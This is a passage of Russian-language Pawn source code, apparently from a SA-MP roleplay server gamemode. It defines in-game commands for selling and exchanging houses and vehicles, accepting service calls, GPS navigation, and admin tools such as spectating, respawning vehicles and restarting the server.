		playerid, DIALOG_SELL_CAR, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Продажа личного транспорта",
		STRING_GLOBAL,
		"Да", "Нет"
	);

	SetPVarInt(playerid, "sell_car_cost", price);
	SetPVarInt(playerid, "sell_car_percent", percent);

	return 1;
}


/*CMD:sellcopter(playerid, params[])
{
	new rows;
	new Cache: result;

    STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM copters WHERE owner_name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	if(rows < 1 || rows > 3)
		return SendClientMessage(playerid, C_RED, "У Вас нет личного вертолета"), cache_delete(result);

	if(PI[playerid][pCheckCode] == 0)
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Информация] {FFFFFF}Вы не можете продать свой вертолет пока не установите графический пароль (/menu > Безопасность > Графический пароль)");

	if(PI[playerid][PlayerCopterID] == INVALID_VEHICLE_ID)
		return SendClientMessage(playerid, 0xFFCC00FF, "Ваш вертолет не загружен, используйте: /fixcopter");

	new model = GetVehicleModel(PI[playerid][PlayerCopterID]);
	if(!model) return 1;


	new price,
		percent;

	for(new idx = 0; idx < sizeof(copter_cars); idx ++)
	{
		if(model != copter_cars[idx][copID])
			continue;

		price = copter_cars[idx][copCost];

		percent = copter_cars[idx][copCost] * 20 / 100;

		break;
	}

    STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{FFFFFF}Модель:\t%s (№%d)\n\
		Стоимость:\t%d руб\n\n\
		Вы уверены что хотите продать вертолет?\n\
		На Ваш банковский счет будет начислено %d руб",
		GetCarName(model),
		model,
		price,
		price - percent
	);

	ShowPlayerDialog
	(
		playerid, DIALOG_SELL_COPTER, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Продажа личного вертолета",
		STRING_GLOBAL,
		"Да", "Нет"
	);

	SetPVarInt(playerid, "sell_car_cost", price);
	SetPVarInt(playerid, "sell_car_percent", percent);

	return 1;
}*/

CMD:sellmyhouse(playerid, params[])
{
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома!");

	extract params -> new to_player, price; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /sellmyhouse [ид игрока] [цена]");

	if(price < 0)
		return SendClientMessage(playerid, COLOR_GREY, "Стоимость не может быть отрицательной");

	if(GetPlayerHouse(to_player) != 0) return SendClientMessage(playerid, COLOR_GREY, "У этого игрока уже есть дом!");

	if(GetMoney(playerid) < price) return SendClientMessage(playerid, C_RED, "У игрока недостаточно денег");

	SendPlayerProposition(playerid, to_player, PROPOSITION_TYPE_SELL_HOUSE, price);

	return 1;
}

CMD:changehouse(playerid, params[])
{
	if(PI[playerid][pCredit] != 0) return SendClientMessage(playerid, COLOR_RED, "Во время кредита Вам запрещено продавать имущество");

	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет дома!");
	else if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /changehouse [id игрока] [доплата]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(GetPlayerHouse(params[0]) == 0) return SendClientMessage(playerid, COLOR_GREY, "У игрока нет дома!");
	else if(params[1] < 0 || params[1] > 15000000) return SendClientMessage(playerid, COLOR_GREY, "Количество доплаты от 1 до 15000000!");
	new i = GetPVarInt(playerid, "PlayerHouse");
	new i2 = GetPVarInt(params[0], "PlayerHouse");

	if(params[1] > HouseInfo[i][hPrice]*2)
		return SendClientMessage(playerid, C_RED, "Вы не можете продать дом дороже гос. цены в два раза");

	if(IsPlayerInRangeOfPoint(playerid, 5.0, HouseInfo[i][hEntrx], HouseInfo[i][hEntry], HouseInfo[i][hEntrz]) || IsPlayerInRangeOfPoint(playerid, 15.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
	{
		if(IsPlayerInRangeOfPlayer(3.0, playerid, params[0]) && params[0] != INVALID_PLAYER_ID)
		{
			if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете обменять дом себе!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предлежили обменяться домами с %s. Твоя доплата: %d",GetName(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s предлежил обменяться домами с вами. Доплата: %d",GetName(playerid), params[1]);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFF00}%s предложил обменять свой дом\n\n\t\t{ffffff}(Номер: %d, Класс: %s, Доплата: %d)\n{FFFF00}на Ваш дом\n\t\t{ffffff}(Номер: %d, Тип: %s)\n\n{FFFF00}Вы согласны?", GetName(playerid), i, HouseInfo[i][hDiscript], params[1], i2, HouseInfo[i2][hDiscript]);
			ShowPlayerDialog(params[0], D_SELLHOUSE+1, 0, "Обменять дом", STRING_GLOBAL, "Да", "Нет");

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFF00}Вы предложили %s обменять свой дом\n\n\t\t{ffffff}(Номер: %d, Тип: %s, Доплата: %d)\n{FFFF00}на его дом\n\t\t{ffffff}(Номер: %d, Тип: %s)", GetName(params[0]), i, HouseInfo[i][hDiscript], params[1], i2, HouseInfo[i2][hDiscript]);
			ShowPlayerDialog(playerid, D_NULL, 0, "Обменять дом", STRING_GLOBAL, "Закрыть", "");
			HouseOffer[params[0]] = playerid;
			HousePrice[params[0]] = params[1];
		}
		else SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться рядом с тобой!");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в вашем доме!");
	return 1;
}

CMD:vpc(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(GetPVarInt(playerid, "AddVehicleFrac") == 0) return 1;
	else if(GetPlayerState(playerid) != 2) return 1;
	else if(!IsPlayerInVehicle(playerid, GetPVarInt(playerid, "AddVehicleFrac"))) return 1;
	new Float:X,Float:Y,Float:Z,Float:FA;
	GetVehicleZAngle(GetPlayerVehicleID(playerid), FA);
	GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
	DestroyVehicle(GetPVarInt(playerid, "AddVehicleFrac"));
	TOTALVEH++;
	sscanf(coordv, "p<,>iiiiiii", VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vColor][0],
	VehInfo[TOTALVEH][vColor][1],VehInfo[TOTALVEH][vFraction],VehInfo[TOTALVEH][vInt],VehInfo[TOTALVEH][vWorld], VehInfo[TOTALVEH][vStatus]);
	format(VehInfo[TOTALVEH][vColors], 16, "%i, %i", VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1]);
	VehInfo[TOTALVEH][vPos_X] = X;
	VehInfo[TOTALVEH][vPos_Y] = Y;
	VehInfo[TOTALVEH][vPos_Z] = Z;
	VehInfo[TOTALVEH][vPos_FA] = FA;
	VehInfo[TOTALVEH][vVehicle] = CreateVehicle(VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vPos_X], VehInfo[TOTALVEH][vPos_Y], VehInfo[TOTALVEH][vPos_Z], VehInfo[TOTALVEH][vPos_FA],VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1], 300);
	LinkVehicleToInterior(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vInt]);
	SetVehicleVirtualWorld(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vWorld]);
	ClearVehicleData(VehInfo[TOTALVEH][vVehicle]);
	DeletePVar(playerid, "AddVehicleFrac");

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"INSERT INTO "T_VEHICLE" (id, model, x, y, z, fa, vint, world, colors, fraction, status) VALUES (%i, %i, '%f', '%f', '%f', '%f', %i, %i, '%s', %i, %i)",
	TOTALVEH,VehInfo[TOTALVEH][vModel],VehInfo[TOTALVEH][vPos_X],VehInfo[TOTALVEH][vPos_Y],VehInfo[TOTALVEH][vPos_Z],VehInfo[TOTALVEH][vPos_FA],VehInfo[TOTALVEH][vInt],
	VehInfo[TOTALVEH][vWorld],VehInfo[TOTALVEH][vColors],VehInfo[TOTALVEH][vFraction], VehInfo[TOTALVEH][vStatus]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	SendMes(playerid, COLOR_LIME, "Транспорт номер %i создан", TOTALVEH);
	return 1;
}

CMD:tpc(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(TPC[playerid] == false)
	{
		if(!IsPlayerInVehicle(playerid, VehTest[playerid])) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в транспорте!");
		new Float:X,Float:Y,Float:Z,Float:FA;
		GetVehicleZAngle(VehTest[playerid], FA);
		GetVehiclePos(VehTest[playerid], X,Y,Z);
		format(coordh, sizeof(coordh), "%f, %f, %f, %f", X, Y, Z, FA);
		DestroyVehicle(VehTest[playerid]);
		VehTest[playerid] = INVALID_VEHICLE_ID;
		TPC[playerid] = true;
		return SendClientMessage(playerid, COLOR_LIGHTRED, "Координаты созданы. Установите интерьер: /tpc");
	}
	if(TPC[playerid] == true)
	{
		new string1[616];
		strcat(string1,"ВАЖНО: Тип интерьера\n\nПРИМЕР: 1\n\n");
		strcat(string1,"1. Низкий класс\n");
		strcat(string1,"2. Средний класс\n");
		strcat(string1,"3. Высокий класс");
		ShowPlayerDialog(playerid,D_ADDNED+1,1,"Добавить дом",string1,"Выбрать","Закрыть");
	}
	return 1;
}

/*CMD:crent(playerid)
{
    if(GetPVarInt(playerid, "arendkey") == -1) return SendClientMessage(playerid, COLOR_FADE1, "Вы не арендуете транспорт.");
	new rc = GetPVarInt(playerid, "arendkey");
	if(ArendInfo[rc][aPlayerID] != playerid)
	{
	    SendClientMessage(playerid, COLOR_FADE1, "Вы не арендуете транспорт");
	    SetPVarInt(playerid, "arendkey", -1);
	    return 1;
	}
	ShowPlayerDialog(playerid, D_CANCELRENT, 0, "Отмена аренды", "\n\n{FF6600}Вы действительно хотите отменить аренду транспорта?\n{FFFFFF}Дальнейшее его использование станет недоступным,\nдо нового заключения договора на аренду транспорта.\n\n", "Принять", "Отмена");
	return 1;
}*/

CMD:unrent(playerid)
{
	if(PI[playerid][P_AREND_SCOOTER] != INVALID_VEHICLE_ID)
	{
		SendClientMessage(playerid, C_WHITE, "Аренда арендованного Вами транспорта была аннулирована.");
		DestroyVehicle(PI[playerid][P_AREND_SCOOTER]);
		PI[playerid][P_AREND_SCOOTER] = INVALID_VEHICLE_ID;
	}
	else if(PI[playerid][TruckerCarID] != INVALID_VEHICLE_ID)
	{
	    DestroyVehicleEx(TruckerCar[playerid]);
	    DestroyVehicleEx(PI[playerid][P_GRUZ_CAR]);
	    PI[playerid][TruckerCarID] = INVALID_VEHICLE_ID;
	    TruckerCar[playerid] = 0;
	    PI[playerid][P_GRUZ_CAR] = 0;
		SendClientMessage(playerid, COLOR_BLUE, "Вы отказались от аренды грузовика");
		DisablePlayerRaceCheckpoint(playerid);
		DeletePVar(playerid, "TruckerJobTime");
		DeletePVar(playerid, "TruckerJobTimeGoToCar");
		DeletePVar(playerid, "TruckerJob");
		DeletePVar(playerid, "TruckerJobRazgruzka");
		DeletePVar(playerid, "TruckerJobFuel");
		pPressed[playerid] = 0;
	}
}
CMD:sp(playerid, params[]) return callcmd::spec(playerid, params);
CMD:spec(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "В транспорте нельзя следить!");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /spec [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[playerid][pAdmin] < 7 && AdminInfo[params[0]][admSpectate]) return SendClientMessage(playerid, COLOR_GREY, "Следить за этим администратором запрещено");
	//else if(GetString(GetName(playerid), NGA1)) return SendClientMessage(playerid, COLOR_GREY, "Следить за этим администратором запрещено");
 	new Float:xPos[4];
	GetPlayerPos(playerid, xPos[0], xPos[1], xPos[2]);
	GetPlayerFacingAngle(playerid, xPos[3]);
	if(PI[playerid][Spectating][0] == INVALID_PLAYER_ID)
	{
	    SetPVarInt(playerid, "SpecInt", GetPlayerInterior(playerid));
		SetPVarInt(playerid, "SpecVw", GetPlayerVirtualWorld(playerid));
		SetPVarFloat(playerid, "SpecX", xPos[0]);
		SetPVarFloat(playerid, "SpecY", xPos[1]);
		SetPVarFloat(playerid, "SpecZ", xPos[2]);
		SetPVarFloat(playerid, "SpecA", xPos[3]);
		if(PI[playerid][pAdmin] < 7)
		{
			new string[128];
			format(string, sizeof(string), "[A] %s[%d] начал наблюдать за %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
    		SendAdminMessage(COLOR_GREY, string);
 		}
	}
	SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
	TogglePlayerSpectating(playerid, 1);
	if(IsPlayerInAnyVehicle(params[0])) PlayerSpectateVehicle(playerid, GetPlayerVehicleID(params[0]));
	else PlayerSpectatePlayer(playerid, params[0]);
	PI[playerid][Spectating][0] = params[0];
	PI[playerid][Spectating][1] = playerid;
	PI[params[0]][P_SPEC_ADM] = playerid;
	PlayerTextDrawDestroy(playerid, PI[playerid][SpecTxt]);
	PI[playerid][SpecTxt] = CreatePlayerTextDraw(playerid, 496.000000, 219.625000, "Spectate");
	PlayerTextDrawBackgroundColor(playerid, PI[playerid][SpecTxt], 255);
	PlayerTextDrawFont(playerid, PI[playerid][SpecTxt], 2);
	PlayerTextDrawLetterSize(playerid, PI[playerid][SpecTxt], 0.240000, 1.271875);
	PlayerTextDrawColor(playerid, PI[playerid][SpecTxt], -1);
	PlayerTextDrawSetOutline(playerid, PI[playerid][SpecTxt], 1);
	PlayerTextDrawShow(playerid, PI[playerid][SpecTxt]);
	return ShowMenuForPlayer(specmenu, playerid);
}

CMD:spoff(playerid, params[]) return callcmd::specoff(playerid, params);
CMD:specoff(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(PI[playerid][Spectating][0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, "Вы не наблюдаете за игроком!");

	PI[PI[playerid][Spectating][0]][P_SPEC_ADM] = INVALID_PLAYER_ID;

	if(PI[playerid][pAdmin] < 7)
	{
		new string[128];
		format(string, sizeof(string), "[A] %s[%d] закончил наблюдение за %s[%i]", GetName(playerid), playerid, GetName(PI[playerid][Spectating][0]), PI[playerid][Spectating][0]);
	    SendAdminMessage(COLOR_GREY, string);
  	}
	TogglePlayerSpectating(playerid, 0);
    PlayerTextDrawHide(playerid, PI[playerid][SpecTxt]);
	PlayerTextDrawDestroy(playerid, PI[playerid][SpecTxt]);
	return HideMenuForPlayer(specmenu, playerid);
}
CMD:iznos(playerid)
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	else if(PI[playerid][pAdmin] < 2) return 1;
	STRING_GLOBAL[0] = EOS;
	new vehicleid = GetPlayerVehicleID(playerid);
	format(STRING_GLOBAL, 600, "\
	{FFFFFF}_________________Личный транспорт_________________\n\n\
	{FFFFFF}Процент износа: {63BD4E}%.1f процентов\n\
	{FFFFFF}________________________________________",
	g_vehicle[vehicleid][veh_wear]);
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{63BD4E}Статистика транспорта", STRING_GLOBAL, "Закрыть", "");
	return 1;
}
CMD:res(playerid, params[])
{
    new radius;
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	else if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "d", radius)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /res [радиус] (радиус от 1 до 80 | значение радиуса '-1' зареспавнит весь транспорт на сервере)");
	else if(!(radius >= -100 && radius <= 0x50)) return SendClientMessage(playerid, COLOR_GREY, "Неверное значение радиуса");
	if(radius == -1)
	{
     	foreach(new i: Vehicle)
		{
			if(!IsValidVehicle(i))
				continue;

			if(GetVehicleData(i, veh_driver_id) != INVALID_PLAYER_ID)
				continue;

			if(g_vehicle[i][veh_autosalon] == true)
				continue;

			if(gVehicleGun[i][vGunLoading] == true)
				continue;

			SetVehiclePos(i, g_vehicle[i][veh_x], g_vehicle[i][veh_y], g_vehicle[i][veh_z]);
			SetVehicleZAngle(i, g_vehicle[i][veh_a]);
			SetVehicleHealth(i, 1000.0);
		}
		new string[128];
		format(string, sizeof(string), "[A] %s зареспавнил весь транспорт на сервере", GetName(playerid));
		SendAdminMessage(COLOR_GREY, string);
	}
	else
	{
	    new Float:x, Float:y, Float:z;
	    foreach(new i: Vehicle)
		{
		    GetPlayerPos(playerid, x, y, z);
		    if(IsVehicleInRangeOfPoint(i, radius, x, y, z))
			{
				if(!IsValidVehicle(i))
					continue;

				SetVehiclePos(i, g_vehicle[i][veh_x], g_vehicle[i][veh_y], g_vehicle[i][veh_z]);
				SetVehicleZAngle(i, g_vehicle[i][veh_a]);
				SetVehicleHealth(i, 1000.0);
			}
		}
		new string[128];
		format(string, sizeof(string), "[A] %s зареспавнил весь транспорт в радиусе %d м", GetName(playerid), radius);
		SendAdminMessage(COLOR_GREY, string);
	}
	return 1;
}

CMD:gomechanic(playerid, params[])
{
	if(PI[playerid][pJob] != JOB_MECHANIC) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gomechanic [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!MechanicON[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не вызывал механика либо его вызов уже приняли");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pJob] == JOB_MECHANIC) SendMes(i, COLOR_YELLOW, "Автомеханик %s принял вызов %s", GetName(playerid), GetName(params[0]));
	}
	SendMes(params[0], COLOR_GREEN, "Автомеханик %s принял Ваш вызов, ждите", GetName(playerid));
	SendMes(playerid, COLOR_GREEN, "Игрок %s отмечен на карте", GetName(params[0]));
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(params[0], X, Y, Z);
	DisablePlayerRaceCheckpoint(playerid);
	SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
	UseGPS[playerid] = true;
	for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
	MechanicON[params[0]] = false;
	SetPVarInt(params[0], "CallMech", gettime()+600);
	return 1;
}

CMD:gotaxi(playerid, params[])
{
    if(PI[playerid][pJob] != JOB_TAXI) return SendMess(playerid, MSG_YOU_CAN_NOT);
    else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gotaxi [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
    else if(!GetPVarInt(playerid, "PriceTaxi")) return SendClientMessage(playerid, COLOR_GREY, "Принять вызов можно только с автомобиля такси с настроеным тарифом!");
	else if(!TaxiON[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не заказывал такси либо его заказ уже приняли");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pJob] == JOB_TAXI) SendMes(i, COLOR_YELLOW, "Таксист %s принял вызов %s",GetName(playerid), GetName(params[0]));
	}
	SendMes(params[0], COLOR_GREEN, "Таксист %s принял Ваш вызов, ждите", GetName(playerid));
	SendMes(playerid, COLOR_GREEN, "Игрок %s отмечен на карте", GetName(params[0]));
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(params[0], X, Y, Z);
	DisablePlayerRaceCheckpoint(playerid);
	SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
	UseGPS[playerid] = true;
	for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
	TaxiON[params[0]] = false;
	SetPVarInt(params[0], "CallTaxi", gettime()+600);
	return 1;
}

CMD:gomedhelp(playerid, params[])
{
    if(!IsAMedic(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gomedhelp [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!MedicON[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не вызывал мед.помощь либо его вызов уже приняли");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(IsAMedic(i)) SendMes(i, COLOR_YELLOW, "%s %s принял вызов %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), GetName(params[0]));
	}
	SendMes(params[0], COLOR_GREEN, "%s %s принял Ваш вызов, ждите", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
	SendMes(playerid, COLOR_GREEN, "Игрок %s отмечен на карте", GetName(params[0]));
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(params[0], X, Y, Z);
	DisablePlayerRaceCheckpoint(playerid);
	SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
	UseGPS[playerid] = true;
	for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
	MedicON[params[0]] = false;
	SetPVarInt(params[0], "CallMedic", gettime()+600);
	return 1;
}

CMD:gopolice(playerid, params[])
{
    if(!IsACop(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gopolice [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(!PoliceON[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не вызывал полицию либо его вызов уже приняли");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(IsACop(i)) SendMes(i, COLOR_YELLOW, "%s %s принял вызов %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), GetName(params[0]));
	}
	SendMes(params[0], COLOR_GREEN, "%s %s принял Ваш вызов, ждите", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid));
	SendMes(playerid, COLOR_GREEN, "Игрок %s отмечен на карте", GetName(params[0]));
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(params[0], X, Y, Z);
	DisablePlayerRaceCheckpoint(playerid);
	SetPlayerRaceCheckpoint(playerid, 1, X, Y, Z, 0.0, 0.0, 0.0, 5);
	UseGPS[playerid] = true;
	for(new i; i < 3; i++) TextDrawShowForPlayer(playerid, gps_td);
	PoliceON[params[0]] = false;
	SetPVarInt(params[0], "CallPolice", gettime()+600);
	return 1;
}

CMD:gps(playerid, params[])
{
    if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "GPS-навигатор не может установить соединение со спутником. Выйдите на улицу.");
    if(UseGPS[playerid])
	{
		if(PI[playerid][P_ORDER_ID] != -1)
			return SendClientMessage(playerid, C_RED, "Во время выполнения заказа Вы не можете пользоваться /gps");

		DisablePlayerRaceCheckpoint(playerid);
    	UseGPS[playerid] = false;

		TextDrawHideForPlayer(playerid, gps_td);
	}

	static fmt_gps_list[] =
	{
		!"{ffffff}1. Основные места \n"\
		"{ffffff}2. По работе\n"\
		"{ffffff}3. Государственные организации\n"\
		"{ffffff}4. Нелегальные организации\n"\
		"{bbd87a}5. Банковские отделения\n"\
		"{ffffff}6. Клубы\n"\
		"{ffffff}7. Развлечения\n"\
		"{ffffff}8. Автосалоны\n"\
		"{e3de5f}9. Ближайшие места\n"\
		"{e3de5f}10. Найти свой дом"\
	};

	ShowPlayerDialog(playerid, D_GPS, DIALOG_STYLE_LIST, "Навигатор", fmt_gps_list, "Выбрать", "Отмена");

	return 1;
}


CMD:gm(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 2) return 1;
    else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gm [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(StartGMTest[playerid] == true) return SendClientMessage(playerid, COLOR_GREY, "Вы тестируете другого человека, подождите окончания теста!");
	new Float:gmhealth;
	GetPlayerHealth(params[0], gmhealth);
	new Float:boomx, Float:boomy, Float:boomz;
	GetPlayerPos(params[0],boomx, boomy, boomz);
    CreateExplosion(boomx, boomy, boomz+7, 5, 0.5);
  	SetTimerEx("GmTest", 1000, false, "ddf", playerid, params[0], gmhealth);
  	StartGMTest[playerid] = true;
    return 1;
}

CMD:setskill(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "udd", params[0], params[1], params[2]))
	{
		SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setskill [id игрока] [номер] [количество]");
		SendClientMessage(playerid, COLOR_WHITE, "0 - Silenced 9mm, 1 - Desert Eagle, 2 - Shotgun, 3 - MP5, 4 - AK47, 5 - M4A1, 6 - Pistol, 7 - Micro Uzi");
		return 1;
	}
	else if(params[1] > 7 || params[1] < 0) return SendClientMessage(playerid, COLOR_GREY, "Неизвестное значение");
	else if(params[2] > 100 || params[2] < 0) return SendClientMessage(playerid, COLOR_GREY, "Значение владения оружием может быть от 0 до 100");
	else if(!IsPlayerConnected(params[0])) return 1;
	g_player_skills[params[0]][S_GUN][params[1]] = params[2];
	SendClientMessage(playerid, COLOR_GRAD1, "Уровень владения оружием игроку установлен");

	SavePlayerSkills(playerid);

	return 1;
}


CMD:gmx(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;

	if(!IsPlayerDeveloperAdmin(playerid)) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);

	for(new x = 25; x > 0; x --) SendClientMessageToAll(COLOR_GREY, " ");
	SendClientMessage(playerid, C_RED, "Внимание! Происходит рестарт на сервере");
	SendClientMessage(playerid, C_RED, "Рестарт будет длиться 20-30 секунд");
	SendClientMessage(playerid, C_RED, "С Уважением администрация HOME ONLINE!");
	SaveWarehouse();
	SetTimer("GameModeExitDelay", 5000, false);
	return 1;
}

CMD:gmxsecretept(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(!IsPlayerDeveloperAdmin(playerid)) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
